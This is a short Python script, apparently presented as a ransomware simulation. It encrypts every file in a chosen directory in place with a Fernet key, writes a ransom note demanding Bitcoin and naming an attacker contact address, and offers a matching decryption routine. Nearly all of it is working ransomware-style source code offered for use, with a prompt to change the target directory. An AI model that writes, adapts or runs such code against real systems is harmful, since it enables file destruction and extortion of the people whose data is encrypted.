# pip install cryptography
import os
import random
import base64
import string
from cryptography.fernet import Fernet

# Generate a random encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("encryption.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Decrypt a file
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Generate ransom note
def create_ransom_note(directory):
    note_path = os.path.join(directory, "RANSOM_NOTE.txt")
    with open(note_path, "w") as note:
        note.write("Your files have been encrypted!\n")
        note.write("Send 1 Bitcoin to the following address: 123xyzFakeBTCAddress\n")
        note.write("Then, contact us at hacker@malicious.com for decryption instructions.\n")

# Encrypt all files in a directory
def encrypt_directory(directory):
    generate_key()  # Create a new encryption key
    key = load_key()

    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if os.path.isfile(file_path) and file != "encryption.key":
            encrypt_file(file_path, key)
    
    create_ransom_note(directory)
    print(f"🚨 All files in {directory} have been encrypted! 🚨")

# Decrypt all files in a directory
def decrypt_directory(directory):
    key = load_key()
    
    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if os.path.isfile(file_path) and file not in ["encryption.key", "RANSOM_NOTE.txt"]:
            decrypt_file(file_path, key)
    
    print(f"🔓 All files in {directory} have been decrypted! 🔓")

if __name__ == "__main__":
    TARGET_DIR = "test_files"  # Change to your target directory

    action = input("Enter 'encrypt' to simulate attack or 'decrypt' to restore files: ").strip().lower()
    
    if action == "encrypt":
        encrypt_directory(TARGET_DIR)
    elif action == "decrypt":
        decrypt_directory(TARGET_DIR)
    else:
        print("Invalid option! Use 'encrypt' or 'decrypt'.")
